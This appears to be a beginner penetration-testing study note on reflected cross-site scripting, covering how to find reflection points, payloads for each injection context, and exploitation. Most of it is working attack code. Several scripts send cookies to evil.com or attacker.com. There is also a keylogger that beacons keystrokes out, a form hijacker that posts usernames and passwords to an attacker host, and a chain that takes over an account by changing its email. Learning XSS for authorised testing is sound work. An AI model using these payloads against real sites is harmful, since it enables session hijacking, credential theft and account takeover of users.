---
tags: [vapt, xss, beginner]
difficulty: beginner
module: "07 - XSS"
topic: "07.02 Reflected XSS"
portswigger_labs: "Cross-site scripting"
---

# 07.02 — Reflected XSS

## What is Reflected XSS?

Reflected XSS occurs when user input is immediately reflected in the HTTP response without storage. The payload travels in the request (URL, form data) and comes right back in the response. The victim must be tricked into clicking a crafted URL.

```
FLOW:
  1. Attacker crafts malicious URL:
     https://target.com/search?q=<script>document.location='https://evil.com/?c='+document.cookie</script>
  
  2. Attacker sends this URL to victim (email, message, social media)
  
  3. Victim clicks the link → browser sends request to target.com
  
  4. target.com reflects the query back:
     <p>Search results for: <script>document.location='https://evil.com/?c='+document.cookie</script></p>
  
  5. Victim's browser executes the script!
  
  6. Victim's cookies sent to attacker!
  
  7. Attacker logs in as victim!
```

---

## Finding Reflected XSS

```bash
# STEP 1: FIND REFLECTION POINTS
# Look for input that appears in the response:
curl "https://target.com/search?q=TESTVALUE" | grep "TESTVALUE"
# → 'Your search for: TESTVALUE' in response → input reflected!

# STEP 2: TEST HTML INJECTION
# Try basic HTML tag:
curl "https://target.com/search?q=<b>test</b>" | grep -i "test"
# → <b>test</b> rendered (not encoded) → HTML injection!

# STEP 3: TEST SCRIPT EXECUTION
curl "https://target.com/search?q=<script>alert(1)</script>"
# → Check response — is <script> present? OR is it HTML-encoded?

# STEP 4: LOOK AT CONTEXT IN PAGE SOURCE
# Download the response and view source to understand:
# INSIDE HTML:          <p>VALUE</p>          → direct HTML injection
# INSIDE ATTRIBUTE:     <input value="VALUE"> → need to break out of attribute
# INSIDE JAVASCRIPT:    var x = "VALUE";      → need to escape string context
# INSIDE URL:           href="VALUE"          → javascript: URI
```

---

## Context-Specific Payloads

### Inside HTML Body

```html
<!-- STANDARD: -->
<script>alert(1)</script>
<script>alert(document.domain)</script>

<!-- EVENT HANDLERS (no <script> needed): -->
<img src=x onerror=alert(1)>
<img src=x onerror=document.location='https://evil.com/?c='+document.cookie>
<svg onload=alert(1)>
<body onload=alert(1)>
<details open ontoggle=alert(1)>
<input autofocus onfocus=alert(1)>
<video src=x onerror=alert(1)>
<audio src=x onerror=alert(1)>

<!-- WITHOUT QUOTES: -->
<img/src=x/onerror=alert(1)>
<img src=x onerror=alert`1`>  <!-- backtick instead of () -->
```

### Inside HTML Attribute

```html
<!-- ORIGINAL:  <input value="USER_INPUT"> -->
<!-- BREAK OUT: -->
"><script>alert(1)</script>
" onmouseover="alert(1)
" autofocus onfocus="alert(1)
" onblur="alert(1)" x="

<!-- WITHOUT QUOTES (value= has no quotes): -->
<!-- ORIGINAL: <input value=USER_INPUT> -->
x onmouseover=alert(1)
x/onmouseover=alert(1)
```

### Inside JavaScript String

```javascript
// ORIGINAL:  var query = "USER_INPUT";
// ESCAPE:    
"-alert(1)-"
";alert(1)//
";alert(1);"
\";alert(1);//
'+alert(1)+'   // if single-quoted
</script><script>alert(1)</script>  // close script tag, open new one!
```

### Inside HTML href/src Attribute

```html
<!-- ORIGINAL: <a href="USER_INPUT"> -->
javascript:alert(1)
javascript:alert(document.cookie)

<!-- DATA URI: -->
data:text/html,<script>alert(1)</script>
```

---

## Testing Methodology

```bash
# 1. MAP ALL REFLECTION POINTS:
# Use a canary: unique string like "xsstest1234"
# Search page source for it → see how it appears

# 2. DETERMINE ENCODING:
curl "https://target.com/search?q=<>\"'" | grep -c "&lt;"
# If > in source is < then encoding happening!

# 3. MINIMAL PoC FIRST:
curl "https://target.com/search?q=<script>alert(document.domain)</script>"
# Check source — does script tag appear unencoded?

# 4. FULL EXPLOITATION:
COOKIE_STEAL='<script>new Image().src="https://evil.com/c?"+document.cookie</script>'
python3 -c "import urllib.parse; print(urllib.parse.quote('$COOKIE_STEAL'))"
# URL-encode the payload for use in crafted link

# 5. TEST IN BROWSER:
# Open browser dev tools → Sources → reload page with payload
# Check if alert fires (CSP may block it in console)
```

---

## Exploitation Examples

### Session Cookie Theft

```javascript
// METHOD 1: Image beacon (stealthy, no redirect)
<script>new Image().src='https://attacker.com/steal?c='+encodeURIComponent(document.cookie)</script>

// METHOD 2: Fetch API
<script>fetch('https://attacker.com/steal?c='+btoa(document.cookie))</script>

// METHOD 3: Document location (visible redirect)
<script>document.location='https://attacker.com/steal?c='+document.cookie</script>

// COLLECT AT ATTACKER SIDE:
// Set up simple HTTP server:
python3 -m http.server 80
// Cookies arrive at: GET /steal?c=session=ABC123
```

### Keylogger

```javascript
<script>
document.onkeypress=function(e){
  new Image().src='https://attacker.com/k?k='+e.key;
}
</script>
```

### Form Hijacking

```javascript
<script>
document.querySelector('form').onsubmit=function(){
  fetch('https://attacker.com/creds',{
    method:'POST',
    body:JSON.stringify({
      user:document.querySelector('[name=username]').value,
      pass:document.querySelector('[name=password]').value
    })
  });
}
</script>
```

---

## Escalating to Account Takeover (No Cookie Needed)

```javascript
// Even with HttpOnly cookies, XSS can take over account:
// Step 1: Get CSRF token from page
var token = document.querySelector('[name=csrf_token]').value;

// Step 2: Change email via API
fetch('/api/change-email', {
  method: 'POST',
  headers: {'Content-Type': 'application/json',
            'X-CSRF-Token': token},
  body: JSON.stringify({email: 'attacker@evil.com'})
}).then(r => {
  // Step 3: Trigger password reset
  fetch('/api/forgot-password', {
    method: 'POST',
    body: JSON.stringify({email: 'attacker@evil.com'})
  });
});
```

---

## Automation Tools

```bash
# DALFOX (fast XSS scanner):
dalfox url "https://target.com/search?q=test"
dalfox url "https://target.com/search?q=test" --skip-bav  # skip blind XSS
dalfox url "https://target.com/search?q=test" --blind "https://attacker.com/callback"

# XSSTRIKE:
python3 xsstrike.py -u "https://target.com/search?q=test"
python3 xsstrike.py -u "https://target.com/search?q=test" --crawl

# BURP ACTIVE SCANNER (Pro):
# Burp automatically tests all inputs

# MANUAL BURP:
# Send to Intruder → Payload: XSS wordlist from SecLists
# Payload: /usr/share/wordlists/seclists/Fuzzing/XSS/XSS-Jhaddix.txt
```

---

## Related Notes
- [[01 - What is XSS and Why It Matters]] — XSS overview
- [[03 - Stored XSS]] — stored variant
- [[04 - DOM-Based XSS]] — DOM-based variant
- [[14 - XSS Filter Bypass Techniques]] — bypassing filters
- [[21 - XSS Payloads Comprehensive List]] — full payload reference
